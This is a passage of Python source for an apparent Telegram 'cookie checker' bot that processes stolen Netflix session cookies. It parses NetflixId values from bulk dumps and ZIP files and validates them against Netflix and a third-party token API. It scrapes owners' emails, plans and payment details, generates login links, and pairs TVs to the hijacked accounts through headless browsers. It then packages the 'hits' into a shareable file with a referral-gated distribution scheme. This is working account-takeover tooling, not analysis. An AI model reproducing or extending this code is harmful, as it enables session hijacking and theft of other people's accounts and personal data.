                    return False, None
                if r3.status_code == 200:
                    return True, r3.text or ""
            except Exception:
                pass

            return False, None
    except Exception:
        return False, None

def parse_smart_cookie(c_in):
    """Extract the NetflixId value from any supported cookie format.

    Supported formats (checked in order):
      1. JSON array  — [{\"name\": \"NetflixId\", \"value\": \"...\"}]
      2. JSON object — {\"NetflixId\": \"...\"}
      3. Netscape TSV — tab-separated lines (col 5 = name, col 6 = value)
      4. Whitespace-separated — "NetflixId  VALUE"
      5. Equals-separated — "NetflixId=VALUE" (semicolon-separated or plain)
    """
    c_in = c_in.strip()

    # Format 1 & 2: JSON
    try:
        data = json.loads(c_in)
        if isinstance(data, list):
            for entry in data:
                if isinstance(entry, dict) and entry.get("name") == "NetflixId":
                    return urllib.parse.unquote(str(entry.get("value", "")))
        elif isinstance(data, dict):
            if "NetflixId" in data:
                return urllib.parse.unquote(str(data["NetflixId"]))
    except Exception:
        pass

    # Format 3: Netscape TSV (tab-delimited, 7+ columns, col[5]=name, col[6]=value)
    for line in c_in.splitlines():
        parts = line.strip().split('\t')
        if len(parts) >= 7:
            name_field = parts[5].strip()
            if name_field.startswith('#HttpOnly_'):
                name_field = name_field[len('#HttpOnly_'):]
            elif name_field.startswith('#'):
                name_field = name_field.lstrip('#')
            if name_field == "NetflixId":
                return urllib.parse.unquote(parts[6].strip())

    # Format 4: whitespace-separated "NetflixId  VALUE"
    match = re.search(r"NetflixId\s+([^\s;=]+)", c_in)
    if match:
        return urllib.parse.unquote(match.group(1))

    # Format 5: equals-separated "NetflixId=VALUE"
    match = re.search(r"NetflixId=([^;|\n\r\t ]+)", c_in)
    if match:
        return urllib.parse.unquote(match.group(1))

    return None

def _db_row_cookie(row: dict):
    """Extract and normalize a Netflix cookie from a DB row."""
    if not isinstance(row, dict):
        return None
    # Keep backward compatibility with older/mixed DB schemas where cookie
    # payload was stored under different column names.
    raw = ""
    for key in ("data", "cookie", "netflixid", "NetflixId"):
        val = row.get(key)
        if val:
            raw = val
            break
    nid = parse_smart_cookie(str(raw))
    if not nid:
        return None
    return f"NetflixId={nid}"



def _tv_activate_requests(nid: str, code_clean: str, link3: str = None) -> tuple:
    """
    TV activation — tries multiple methods.
    Returns (success: bool, message: str)
    """
    # Ensure clean nid
    if nid.startswith("NetflixId="):
        nid = nid[len("NetflixId="):]
    nid = nid.strip()
    if not nid:
        return False, "Invalid cookie session."

    # ── Method 1: NFToken tv.php via FIFO queue ───────────────────────────
    try:
        tv_res = _nftoken_tv_call(nid, code_clean)
        if isinstance(tv_res, dict):
            status = tv_res.get("status", "")
            msg = tv_res.get("message", "")
            is_html = bool(msg and re.search(r'</?[a-zA-Z!][^>]*>', msg))
            if status == "SUCCESS":
                return True, "✅ Your TV is now connected to Netflix! 🎉"
            if msg and not is_html:
                if any(k in msg.lower() for k in ["invalid", "expired", "wrong", "incorrect", "not valid"]):
                    return False, msg
                if any(k in msg.lower() for k in ["success", "connected", "activated"]):
                    return True, "✅ Your TV is now connected! 🎉"
    except Exception:
        pass

    # ── Method 2: Try alternate cookie formats via FIFO queue ─────────────
    # Some third-party TV endpoints accept different cookie encodings:
    # full "NetflixId=...", raw nid value, or URL-encoded "ct%3D..." token.
    for fmt in [f"NetflixId={nid}", nid, f"ct%3D{nid}"]:
        try:
            event = threading.Event()
            holder = {"result": {}, "func": lambda f=fmt: requests.post(
                "https://nftoken.site/v1/tv.php",
                json={"key": NFTOKEN_KEY, "cookie": f, "tv_code": code_clean},
                timeout=20
            ).json()}
            _API_QUEUE.put((event, holder))
            event.wait(timeout=60)
            d = holder.get("result", {})
            if isinstance(d, dict) and d.get("status") == "SUCCESS":
                return True, "✅ Your TV is now connected to Netflix! 🎉"
        except Exception:
            pass

    # ── Method 3: Direct Netflix activate (requests-based fallback) ───────
    _browser_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36"
    session = requests.Session()
    session.max_redirects = 5
    session.headers.update({"User-Agent": _browser_ua, "Accept-Language": "en-US,en;q=0.9"})
    session.cookies.set("NetflixId", nid, domain=".netflix.com", path="/")

    SUCCESS = ["activated", "connected", "congratulations", "activation-complete", "device-activated"]
    FAILURE = ["invalid", "incorrect", "expired", "activation-code-error"]

    # Try link3 if provided
    if link3 and str(link3).startswith("http"):
        try:
            r = session.get(link3, timeout=12, allow_redirects=False)
            loc = r.headers.get("Location", "") or ""
            if any(h in loc.lower() or h in (r.text or "").lower() for h in SUCCESS):
                return True, "✅ Your TV is now connected! 🎉"
        except Exception:
            pass

    # Direct activate page POST
    try:
        r0 = session.get("https://www.netflix.com/activate", timeout=10, allow_redirects=False)
        auth_m = re.search(r'"authURL"\s*:\s*"([^"]+)"', r0.text or "")
        payload = {"activationCode": code_clean, "numDecimalDigits": 0}
        if auth_m: payload["authURL"] = auth_m.group(1)

        r1 = session.post("https://www.netflix.com/api/shakti/mre/activate",
            json=payload, timeout=12, allow_redirects=False,
            headers={"Content-Type": "application/json", "Referer": "https://www.netflix.com/activate"})
        if r1.status_code in (200, 201):
            try:
                j = r1.json()
                if j.get("status") in ("success", "SUCCESS") or j.get("activated"):
                    return True, "✅ TV activated! 🎉"
                err = j.get("error", j.get("message", ""))
                if err and not re.search(r'</?[a-zA-Z!]', str(err)):
                    return False, str(err)[:100]
            except Exception: pass
    except Exception:
        pass

    # ── Method 4: Playwright browser activation fallback ───────────────────
    if _PLAYWRIGHT_OK:
        acquired = BROWSER_SEMAPHORE.acquire(timeout=30)
        if acquired:
            try:
                with _sync_playwright() as p:
                    browser = p.chromium.launch(
                        headless=True,
                        args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                    )
                    try:
                        ctx = browser.new_context(
                            viewport={"width": 1280, "height": 720},
                            java_script_enabled=True,
                            user_agent=HEADERS.get("User-Agent", _browser_ua),
                        )
                        ctx.add_cookies([{
                            "name": "NetflixId", "value": nid,
                            "domain": ".netflix.com", "path": "/"
                        }])
                        page = ctx.new_page()
                        target = link3 if (link3 and str(link3).startswith("http")) else "https://www.netflix.com/activate"
                        page.goto(target, timeout=18000, wait_until="domcontentloaded")
                        page.wait_for_timeout(900)

                        if "login" in page.url.lower():
                            return False, "Cookie session expired. Please use a fresh cookie."

                        filled = False
                        for sel in [
                            "input[name='activationCode']",
                            "input[name='code']",
                            "input[id*='activation']",
                            "input[id*='code']",
                            "input[type='tel']",
                            "input[type='text']",
                        ]:
                            try:
                                page.locator(sel).first.fill(code_clean, timeout=1200)
                                filled = True
                                break
                            except Exception:
                                pass

                        if not filled:
                            return False, "Could not find TV code input on activation page."

                        clicked = False
                        for bsel in [
                            "button[type='submit']",
                            "button:has-text('Continue')",
                            "button:has-text('Next')",
                            "button:has-text('Activate')",
                        ]:
                            try:
                                page.locator(bsel).first.click(timeout=1000)
                                clicked = True
                                break
                            except Exception:
                                pass
                        if not clicked:
                            try:
                                page.keyboard.press("Enter")
                            except Exception:
                                pass

                        page.wait_for_timeout(2500)
                        cur_url = page.url.lower()
                        txt = (page.content() or "").lower()
                        if any(k in cur_url or k in txt for k in SUCCESS):
                            return True, "✅ Your TV is now connected to Netflix! 🎉"
                        if any(k in cur_url or k in txt for k in FAILURE):
                            return False, "Invalid or expired TV code. Please generate a fresh code."
                    finally:
                        try:
                            browser.close()
                        except Exception:
                            pass
            except Exception:
                pass
            finally:
                BROWSER_SEMAPHORE.release()

    return False, "NFToken API could not complete TV login. Please get a fresh code."


def _extract_raw_text_from_download(data: bytes, filename: str) -> str:
    """
    Return all text content from a downloaded file.
    Handles plain text/JSON files and ZIP archives (including nested ZIPs and
    subdirectories inside ZIPs) recursively.  Only .txt and .json files are
    read; other entries are skipped.
    """
    fname_lower = filename.lower() if filename else ""

    # ── ZIP file (by name or by magic bytes) ──────────────────────────────
    is_zip = fname_lower.endswith('.zip') or (len(data) >= 4 and data[:4] == b'PK\x03\x04')
    if is_zip:
        try:
            raw_text = ""
            with zipfile.ZipFile(io.BytesIO(data)) as z:
                for member in z.namelist():
                    member_lower = member.lower()
                    # Skip directories
                    if member.endswith('/') or member.endswith('\\'):
                        continue
                    # Nested ZIP → recurse
                    if member_lower.endswith('.zip'):
                        try:
                            nested_data = z.read(member)
                            raw_text += _extract_raw_text_from_download(nested_data, member)
                        except Exception:
                            pass
                    elif member_lower.endswith('.txt') or member_lower.endswith('.json'):
                        try:
                            with z.open(member) as f:
                                raw_text += f.read().decode('utf-8', errors='ignore') + "\n\n"
                        except Exception:
                            pass
            return raw_text
        except Exception:
            pass

    # ── Plain text / JSON ─────────────────────────────────────────────────
    return data.decode('utf-8', errors='ignore')


def extract_cookies_from_block(text):
    """
    Extract a list of raw cookie strings from a text block that may contain
    one or more cookies in any supported format (JSON array, semicolon-string,
    Netscape TSV, raw NetflixId=...).  Returns a de-duplicated list of raw
    cookie strings, one entry per unique NetflixId value found.
    """
    seen_nids = set()
    results = []

    def _add(raw, nid):
        nid_clean = nid.strip()
        if nid_clean and nid_clean not in seen_nids:
            seen_nids.add(nid_clean)
            results.append(raw.strip())

    # ── 1. Try to find JSON arrays in the text ─────────────────────────────
    # A file can contain multiple JSON arrays, one per "block"
    json_blocks = re.findall(r'\[\s*\{.*?\}\s*\]', text, re.DOTALL)
    for block in json_blocks:
        try:
            data = json.loads(block)
            if isinstance(data, list):
                nid_val = None
                for entry in data:
                    if isinstance(entry, dict) and entry.get("name") == "NetflixId":
                        nid_val = urllib.parse.unquote(str(entry.get("value", "")))
                        break
                if nid_val:
                    _add(block, nid_val)
        except:
            pass

    # If we found JSON blocks, remove them from remaining text so we don't
    # double-count
    remaining = re.sub(r'\[\s*\{.*?\}\s*\]', '', text, flags=re.DOTALL)

    # ── 2. Netscape TSV format ─────────────────────────────────────────────
    # Strategy: collect all tab-delimited lines into groups separated by blank
    # lines OR by a "# Netscape" / "# http" header.  Each group represents one
    # account's cookie set.  Then scan every line in every group for NetflixId.
    # This handles both well-separated files (one blank line per account) AND
    # tightly packed files (no blank lines, 100 Netscape rows back-to-back).
    lines = remaining.splitlines()
    netscape_groups = []
    current_group = []
    for line in lines:
        stripped = line.strip()
        if stripped.startswith('# Netscape') or stripped.startswith('# http'):
            if current_group:
                netscape_groups.append(current_group)
            current_group = []
        elif stripped and ('\t' in stripped):
            current_group.append(line)
        else:
            if current_group:
                netscape_groups.append(current_group)
            current_group = []
    if current_group:
        netscape_groups.append(current_group)

    # Flatten: scan every tab-delimited line in every group for NetflixId.
    # Each unique NetflixId is one cookie entry; its "raw" form is the full
    # group it came from (so the group text is associated with one NID).
    for group in netscape_groups:
        group_text = "\n".join(group)
        # Collect all NetflixId values found within this group (could be 1 or many
        # if the group was never split by blank lines in a packed file).
        for line in group:
            parts = line.strip().split('\t')
            if len(parts) >= 7:
                name_field = parts[5].strip()
                if name_field.startswith('#HttpOnly_'):
                    name_field = name_field[len('#HttpOnly_'):]
                elif name_field.startswith('#'):
                    name_field = name_field.lstrip('#')
                if name_field == "NetflixId":
                    nid_val = urllib.parse.unquote(parts[6].strip())
                    # Use clean NetflixId=value as the stored raw cookie
                    _add(f"NetflixId={nid_val}", nid_val)
        # Remove processed lines from remaining to avoid double-counting
        for line in group:
            remaining = remaining.replace(line, '', 1)

    # ── 3. Semicolon-separated Format 2 lines ─────────────────────────────
    for line in remaining.splitlines():
        if 'NetflixId=' in line and ';' in line:
            m = re.search(r"NetflixId=([^;|\n\r\t ]+)", line)
            if m:
                nid_val = urllib.parse.unquote(m.group(1))
                _add(line.strip(), nid_val)

    # ── 4. Raw single-value lines "NetflixId=VALUE" ────────────────────────
    for line in remaining.splitlines():
        line = line.strip()
        if line.startswith('NetflixId=') and ';' not in line and '\t' not in line:
            m = re.match(r"NetflixId=([^\s]+)", line)
            if m:
                nid_val = urllib.parse.unquote(m.group(1))
                _add(line, nid_val)

    # ── 5. Universal regex fallback ────────────────────────────────────────
    # Catches any remaining NetflixId occurrences not matched above, covering
    # edge-case formats: tab-separated bare lines, unusual whitespace, etc.
    for match in re.finditer(r'NetflixId[\t =]([^\s;\t\n\r|]{10,})', remaining):
        nid_val = urllib.parse.unquote(match.group(1).strip())
        if nid_val:
            _add(f"NetflixId={nid_val}", nid_val)

    return results

def check_cookie_fast(cookie_input, api_key=None):
    nid = parse_smart_cookie(cookie_input)
    if not nid: return {"valid": False}
    clean_cookie = f"NetflixId={nid}"
    key = (api_key or NFTOKEN_KEY or "").strip()

    # ── 1. Try NFTOKEN API via FIFO rate-limited queue ────────────────────
    api_res = {}
    api_success = False
    if key and not _api_circuit_open():
        try:
            api_res = _nftoken_api_call(nid, key)
            if isinstance(api_res, dict) and api_res.get("status") == "SUCCESS":
                api_success = True
                _api_record_success()
            elif isinstance(api_res, dict) and api_res.get("status") in ("RATE_LIMIT", "ERROR"):
                _api_record_failure()
        except Exception:
            _api_record_failure()

    # ── 2. Fallback: direct Netflix session check ─────────────────────────
    # If the API didn't confirm validity (rate-limited, key expired, or any
    # error), hit Netflix directly.  This is the same check every other
    # cookie-checker bot uses and is unaffected by API issues.
    direct_html = None
    if not api_success:
        direct_valid, direct_html = _check_netflix_session(nid)
        if not direct_valid:
            return {"valid": False}

    # ── 3. Extract account details ────────────────────────────────────────
    deep_data = {
        "plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A",
        "phone": "N/A", "country": "Unknown", "price": "Unknown", "quality": "Unknown",
        "name": "Unknown", "extra_members": "No ❌", "member_since": "Unknown",
        "member_duration": "", "profiles": [], "status": "Unknown", "has_ads": "No ❌",
        "max_streams": "Unknown", "email_verified": "No ❌", "phone_verified": "No ❌",
        "auto_payment": "No ❌"
    }
    # Netflix /browse is a React SPA shell — it never contains account JSON.
    # Always fetch /YourAccount which embeds falcorCache JSON with plan/email/etc.
    try:
        with requests.Session() as session:
            session.headers.update(HEADERS)
            session.cookies.set("NetflixId", nid, domain=".netflix.com")
            acc_resp = session.get("https://www.netflix.com/YourAccount", timeout=8, allow_redirects=True)
            # If redirected to login, cookie expired between the two checks
            if "login" not in str(acc_resp.url).lower() and acc_resp.status_code == 200:
                parsed = extract_deep_details(acc_resp.text)
                # Only use if we got at least one real field
                if any(v not in ("Unknown", "N/A", "No ❌", "", []) for v in parsed.values()):
                    deep_data = parsed
    except:
        pass

    # Fill gaps from API data (when API succeeded it may have extra fields)
    if isinstance(api_res, dict):
        if deep_data["email"]        == "N/A":     deep_data["email"]        = api_res.get("x_mail", api_res.get("email",   "N/A"))
        if deep_data["country"]      == "Unknown": deep_data["country"]      = api_res.get("x_loc",  api_res.get("country", "Unknown"))
        if deep_data["plan"]         == "Unknown": deep_data["plan"]         = api_res.get("x_tier", api_res.get("plan",    "Unknown"))
        if deep_data["expiry"]       == "N/A":     deep_data["expiry"]       = api_res.get("x_ren",  "N/A")
        if deep_data["member_since"] == "Unknown": deep_data["member_since"] = api_res.get("x_mem",  "Unknown")

    # API links from NFToken.site
    api_link  = api_res.get("x_l1") or api_res.get("login_url") if isinstance(api_res, dict) else None
    api_link2 = api_res.get("x_l2") if isinstance(api_res, dict) else None
    api_link3 = api_res.get("x_l3") if isinstance(api_res, dict) else None

    # Generate NFToken via iOS API (no rate limit!) as primary link source
    ios_link1 = ios_link2 = ios_link3 = ios_exp = None
    try:
        ios_token, ios_exp = gen_ios_nftoken(nid)
        if ios_token:
            ios_link1, ios_link2, ios_link3 = ios_nftoken_links(ios_token)
    except Exception:
        pass

    # Prefer iOS-generated links for PC/Mobile, but prefer API x_l3 for TV
    # because it is the dedicated TV flow URL when available.
    final_link1 = ios_link1 or (api_link  if str(api_link  or "").startswith("http") else None)
    final_link2 = ios_link2 or (api_link2 if str(api_link2 or "").startswith("http") else None)
    final_link3 = (api_link3 if str(api_link3 or "").startswith("http") else None) or ios_link3

    return {
        "valid": True,
        "country": deep_data["country"],
        "link":  final_link1,
        "link2": final_link2,
        "link3": final_link3,
        "link_expiry": ios_exp,
        "data": deep_data,
        "screenshot": None
    }

def check_cookie(cookie_input, get_screenshot=True):
    nid = parse_smart_cookie(cookie_input)
    if not nid: return {"valid": False, "msg": "Invalid Cookie Format"}
    # Normalize: always send clean NetflixId=value to API
    clean_cookie = f"NetflixId={nid}"

    # 1. Try NFTOKEN API (bonus: provides login links) — skip when circuit open
    api_res = {}
    api_success = False
    if not _api_circuit_open():
        try:
            api_res = _nftoken_api_call(nid, NFTOKEN_KEY)
            if isinstance(api_res, dict) and api_res.get("status") == "SUCCESS":
                _api_record_success()
                api_success = True
            else:
                _api_record_failure()
        except Exception:
            _api_record_failure()

    # 2. Fallback: direct Netflix session check when API doesn't confirm validity
    direct_html = None
    if not api_success:
        direct_valid, direct_html = _check_netflix_session(nid)
        if not direct_valid:
            msg = api_res.get("message", "Dead Cookie") if isinstance(api_res, dict) else "Dead Cookie"
            return {"valid": False, "msg": msg}

    api_link  = api_res.get("x_l1") or api_res.get("login_url") if isinstance(api_res, dict) else None
    api_link2 = api_res.get("x_l2") if isinstance(api_res, dict) else None
    api_link3 = api_res.get("x_l3") if isinstance(api_res, dict) else None

    # iOS NFToken links (no rate limit — runs in parallel)
    ios_link1 = ios_link2 = ios_link3 = ios_exp = None
    try:
        ios_token, ios_exp = gen_ios_nftoken(nid)
        if ios_token:
            ios_link1, ios_link2, ios_link3 = ios_nftoken_links(ios_token)
    except Exception:
        pass

    # Build final links for output
    final_link1 = ios_link1 or (api_link  if str(api_link  or "").startswith("http") else None)
    final_link2 = ios_link2 or (api_link2 if str(api_link2 or "").startswith("http") else None)
    final_link3 = (api_link3 if str(api_link3 or "").startswith("http") else None) or ios_link3

    # 3. Scrape deep account details (best-effort)
    deep_data = {
        "plan": "Unknown", "payment": "Unknown", "expiry": "N/A", "email": "N/A",
        "phone": "N/A", "country": "Unknown", "price": "Unknown", "quality": "Unknown",
        "name": "Unknown", "extra_members": "No ❌", "member_since": "Unknown",
        "member_duration": "", "profiles": [], "status": "Unknown", "has_ads": "No ❌",
        "max_streams": "Unknown", "email_verified": "No ❌", "phone_verified": "No ❌",
        "auto_payment": "No ❌"
    }
    # Reuse already-fetched HTML from the fallback check to save a request
    if direct_html:
        try:
            deep_data = extract_deep_details(direct_html)
        except:
            pass
    else:
        try:
            with requests.Session() as session:
                session.headers.update(HEADERS)
                session.cookies.set("NetflixId", nid, domain=".netflix.com")
                acc_resp = session.get("https://www.netflix.com/YourAccount", timeout=6)
                deep_data = extract_deep_details(acc_resp.text)
        except:
            pass

    # Fill any gaps with API data
    if isinstance(api_res, dict):
        if deep_data["email"]        == "N/A":     deep_data["email"]        = api_res.get("x_mail", api_res.get("email",   "N/A"))
        if deep_data["country"]      == "Unknown": deep_data["country"]      = api_res.get("x_loc",  api_res.get("country", "Unknown"))
        if deep_data["plan"]         == "Unknown": deep_data["plan"]         = api_res.get("x_tier", api_res.get("plan",    "Unknown"))
        if deep_data["expiry"]       == "N/A":     deep_data["expiry"]       = api_res.get("x_ren",  "N/A")
        if deep_data["member_since"] == "Unknown": deep_data["member_since"] = api_res.get("x_mem",  "Unknown")

    screenshot_bytes = None
    if get_screenshot and _PLAYWRIGHT_OK and SCREENSHOT_SEMAPHORE.acquire(timeout=6):
        try:
            with _sync_playwright() as p:
                browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
                ctx = browser.new_context(viewport={'width': 1280, 'height': 720}, java_script_enabled=True)
                ctx.add_cookies([{'name': 'NetflixId', 'value': nid, 'domain': '.netflix.com', 'path': '/'}])
                pg = ctx.new_page()
                pg.goto("https://www.netflix.com/browse", timeout=6000, wait_until="domcontentloaded")
                try:
                    pg.wait_for_timeout(800)
                except Exception:
                    pass
                try:
                    content = pg.content()
                    pw_profiles = re.findall(r'class="profile-name">([^<]+)<', content)
                    if pw_profiles:
                        deep_data["profiles"] = list(set([clean_text(p) for p in pw_profiles]))
                        deep_data["profiles"] = [p for p in deep_data["profiles"] if p not in ["Add Profile", "Add", "New Profile", "add-profile"]]
                except: pass
                screenshot_bytes = pg.screenshot(type='jpeg', quality=60)
                browser.close()
        except Exception as e:
            print(f"Screenshot Error: {e}")
        finally:
            SCREENSHOT_SEMAPHORE.release()

    return {
        "valid": True,
        "country": deep_data["country"],
        "link":  final_link1,
        "link2": final_link2,
        "link3": final_link3,
        "link_expiry": ios_exp,
        "data": deep_data,
        "screenshot": screenshot_bytes
    }

def check_cookie_browser(cookie_input, get_screenshot=False):
    """Check Netflix cookie validity using a real browser session.

    No API key required. All cookie formats are supported via parse_smart_cookie().
    Up to 20 checks run concurrently (controlled by BROWSER_SEMAPHORE).
    Returns the same dict shape as check_cookie_fast / check_cookie.
    """
    nid = parse_smart_cookie(cookie_input)
    if not nid:
        return {"valid": False, "msg": "Invalid Cookie Format"}

    acquired = BROWSER_SEMAPHORE.acquire(timeout=120)  # wait up to 2 min for a browser slot
    if not acquired:
        return {"valid": False, "msg": "System busy, try again"}

    if not _PLAYWRIGHT_OK:
        BROWSER_SEMAPHORE.release()
        return {"valid": False, "msg": "Browser not available on this host"}

    try:
        with _sync_playwright() as p:
            browser = p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu",
                      "--disable-extensions", "--no-first-run",
                      "--disable-background-networking"]
            )
            try:
                ctx = browser.new_context(
                    viewport={'width': 1280, 'height': 720},
                    java_script_enabled=True,
                    user_agent=HEADERS["User-Agent"]
                )
                ctx.add_cookies([{
                    'name': 'NetflixId', 'value': nid,
                    'domain': '.netflix.com', 'path': '/'
                }])
                pg = ctx.new_page()

                # Navigate to the account overview page
                try:
                    pg.goto("https://www.netflix.com/YourAccount",
                            timeout=20000, wait_until="domcontentloaded")
                except Exception:
                    pass

                final_url = pg.url.lower()

                # If redirected to login, the cookie is dead
                if '/login' in final_url or 'loginhelp' in final_url:
                    return {"valid": False, "msg": "Cookie expired or invalid"}

                # Brief wait for JS-rendered content to settle (~1.5s is enough for account page)
                try:
                    pg.wait_for_timeout(1500)
                except Exception:
                    pass

                content = pg.content()
                deep_data = extract_deep_details(content)

                # Expired or free accounts are not useful
                if deep_data.get("status") in ("Expired", "Free/Never Paid"):
                    return {"valid": False, "msg": deep_data["status"]}

                # If no account data was found AND the URL doesn't look like an account page,
                # treat as dead to avoid false positives
                if deep_data.get("status") == "Unknown" and "account" not in final_url:
                    return {"valid": False, "msg": "Could not verify account"}

                screenshot_bytes = None
                if get_screenshot:
                    try:
                        pg.goto("https://www.netflix.com/browse",
                                timeout=12000, wait_until="domcontentloaded")
                        pg.wait_for_timeout(2500)  # let profile grid render
                        browse_content = pg.content()
                        pw_profiles = re.findall(r'class="profile-name">([^<]+)<', browse_content)
                        if pw_profiles:
                            browse_profiles = list(set([clean_text(p) for p in pw_profiles]))
                            browse_profiles = [p for p in browse_profiles
                                               if p not in ["Add Profile", "Add", "New Profile", "add-profile"]]
                            if browse_profiles:
                                deep_data["profiles"] = browse_profiles
                        screenshot_bytes = pg.screenshot(type='jpeg', quality=60)
                    except Exception:
                        pass

                return {
                    "valid": True,
                    "country": deep_data.get("country", "Unknown"),
                    "link": None, "link2": None, "link3": None,
                    "data": deep_data,
                    "screenshot": screenshot_bytes
                }
            finally:
                try:
                    browser.close()
                except Exception:
                    pass
    except Exception as e:
        return {"valid": False, "msg": f"Browser error: {e}"}
    finally:
        BROWSER_SEMAPHORE.release()


def build_hits_txt(hits, title="NETFLIX VALID ACCOUNTS", include_links=True):
    """Build a nicely formatted text file — each entry shows details + cookie + links together."""
    sep  = "═" * 46
    thin = "─" * 46
    lines = []
    lines.append(sep)
    lines.append(f"  🍿  {title}")
    lines.append(f"  📅  {datetime.now().strftime('%Y-%m-%d %H:%M')}   |   Total: {len(hits)}")
    lines.append(f"  🤖  @F88UF  |  @F88UF9844")
    lines.append(sep)

    for idx, (res, cookie) in enumerate(hits, 1):
        d = res.get('data', {})
        lines.append("")
        lines.append(f"  #{idx}")
        lines.append(thin)
        lines.append(f"  📧 Email    : {d.get('email', 'N/A')}")
        lines.append(f"  👑 Plan     : {d.get('plan', 'Unknown')}")
        lines.append(f"  🌍 Country  : {res.get('country', 'Unknown')}")
        lines.append(f"  📅 Expiry   : {d.get('expiry', 'N/A')}")
        lines.append(f"  💳 Payment  : {d.get('payment', 'Unknown')}")
        lines.append(f"  🖥  Quality  : {d.get('quality', 'Unknown')}")
        lines.append(f"  📆 Member   : {d.get('member_since', 'Unknown')} {d.get('member_duration', '')}")
        lines.append(thin)
        # Cookie block
        lines.append(f"  🍪 COOKIE:")
        lines.append(f"  {cookie}")
        if include_links:
            lines.append(thin)
            lines.append(f"  🔗 LOGIN LINKS:")
            if res.get('link'):
                lines.append(f"  💻 PC     : {res['link']}")
            if res.get('link2'):
                lines.append(f"  📱 Mobile : {res['link2']}")
            if res.get('link3'):
                lines.append(f"  📺 TV     : {res['link3']}")
            if not any([res.get('link'), res.get('link2'), res.get('link3')]):
                lines.append("  ⚠️  No login link available")
        lines.append(thin)

    lines.append("")
    lines.append(sep)
    lines.append("  🔥  @F88UFNETFLIX  |  @F88UF9844")
    lines.append(sep)
    return "\n".join(lines)

def main():
    # BOT_TOKEN is hardcoded above
    keep_alive()

    bot = telebot.TeleBot(BOT_TOKEN)
    telebot.apihelper.RETRY_ON_ERROR = True

    def safe_answer(call_id, text="✅", show_alert=False):
        """Silently ignore 'query too old' errors so the bot never crashes on stale callbacks."""
        try:
            bot.answer_callback_query(call_id, text, show_alert=show_alert)
        except Exception:
            pass

    def _clean_api_msg(msg: str) -> str:
        """Strip BOM, HTML tags, and whitespace from API error messages so they are safe to display."""
        if not msg:
            return ""
        # Remove BOM
        msg = msg.lstrip('\ufeff').strip()
        # If the message looks like HTML, replace it with a generic error
        if re.search(r'</?[a-zA-Z!][^>]*>', msg):
            return "API returned an invalid response. Please try again."
        return msg

    # Fix for 409 Conflict: Remove webhook (including any pending updates) before
    # polling.  drop_pending_updates=True ensures Telegram drops queued updates
    # from a previous session so they don't confuse the new instance.
    try:
        bot.delete_webhook(drop_pending_updates=True)
    except: pass
    # Brief pause so any concurrent old instance can finish its last long-poll
    # cycle and exit before we start polling.
    time.sleep(3)

    # Get bot username for referral links
    _bot_username = "bot"
    try:
        _bot_username = bot.get_me().username or "bot"
    except Exception:
        pass

    user_db = set()
    user_lock = threading.Lock()
    if os.path.exists(USERS_FILE):
        try:
            with open(USERS_FILE, "r") as f: user_db = set(f.read().splitlines())
        except: pass

    if os.path.exists(BANNED_FILE):
        try:
            with open(BANNED_FILE, "r") as f: banned_users.update(l.strip() for l in f if l.strip())
        except: pass

    def ban_user(user_id):
        uid = str(user_id)
        if uid in banned_users: return
        banned_users.add(uid)
        try:
            with open(BANNED_FILE, "a+") as f: f.write(f"{uid}\n")
        except: pass

    def unban_user(user_id):
        uid = str(user_id)
        banned_users.discard(uid)
        try:
            lines = []
            if os.path.exists(BANNED_FILE):
                with open(BANNED_FILE, "r") as f:
                    lines = [l.strip() for l in f if l.strip() and l.strip() != uid]
            with open(BANNED_FILE, "w") as f: f.write("\n".join(lines) + ("\n" if lines else ""))
        except: pass

    def save_user(user_id):
        uid = str(user_id)
        if uid not in user_db:
            with user_lock:
                if uid not in user_db:
                    user_db.add(uid)
                    try:
                        with open(USERS_FILE, "a+") as f: f.write(f"{uid}\n")
                    except: pass

    def check_sub(user_id):
        """Return True if user has joined all required channels.
        Admin ALWAYS passes. API error = assume joined (never block).
        """
        if is_admin(user_id):
            return True
        uid_str = str(user_id)
        cached = _get_referral(uid_str)

        # Already verified or unlocked — trust cache, only re-check if explicitly left
        if cached.get("unlocked") or cached.get("channel_verified"):
            for channel in CHANNELS:
                try:
                    stat = bot.get_chat_member(channel, user_id).status
                    if stat in ('left', 'kicked', 'banned'):
                        cached["channel_verified"] = False
                        _set_referral(uid_str, cached)
                        return False
                except Exception:
                    pass  # API error — trust cache, don't block
            return True

        # Fresh user: live check
        for channel in CHANNELS:
            try:
                stat = bot.get_chat_member(channel, user_id).status
                if stat not in ('creator', 'administrator', 'member', 'restricted'):
                    return False
            except Exception:
                pass  # API error — assume joined, don't block user
        return True

    def is_unlocked(user_id: int) -> bool:
        """Admin is always unlocked. Regular users need 1 successful referral.
        Once unlocked=True is stored, they are unlocked for life."""
        if is_admin(user_id):
            return True
        return bool(_get_referral(str(user_id)).get("unlocked", False))

    def send_referral_prompt(chat_id: int):
        """Show the referral unlock prompt with the user's unique link."""
        ref_link = f"https://t.me/{_bot_username}?start=ref_{chat_id}"
        share_url = (
            "https://t.me/share/url?url="
            + urllib.parse.quote(ref_link, safe='')
            + "&text="
            + urllib.parse.quote("🎬 Join this Netflix bot and get free access!", safe='')
        )
        msg = (
            "🔐 *Bot Locked — One Referral Required!*\n\n"
            "To unlock this bot for *lifetime* free access:\n\n"
            "1️⃣ Share your unique link below with 1 friend\n"
            "2️⃣ Friend must click the link → start the bot → join channels → verify ✅\n"
            "3️⃣ Once your friend verifies, your bot unlocks *forever* 🔓\n\n"
            f"🔗 *Your Referral Link:*\n`{ref_link}`\n\n"
            "⏳ Send anything to see this prompt again until your friend verifies."
        )
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("📤 Share My Link", url=share_url))
        try:
            bot.send_message(chat_id, msg, reply_markup=markup, parse_mode='Markdown', disable_web_page_preview=True)
        except Exception:
            pass

    def send_force_join(chat_id):
        if str(chat_id) in banned_users:
            bot.send_message(chat_id, "🚫 **You are banned from using this bot.**\nContact the admin if you think this is an error.", parse_mode='Markdown')
            return
        markup = types.InlineKeyboardMarkup()
        for ch in CHANNELS: markup.add(types.InlineKeyboardButton(text=f"Join {ch}", url=f"https://t.me/{ch.replace('@', '')}"))
        markup.add(types.InlineKeyboardButton(text="✅ Verify Join", callback_data="verify_join"))
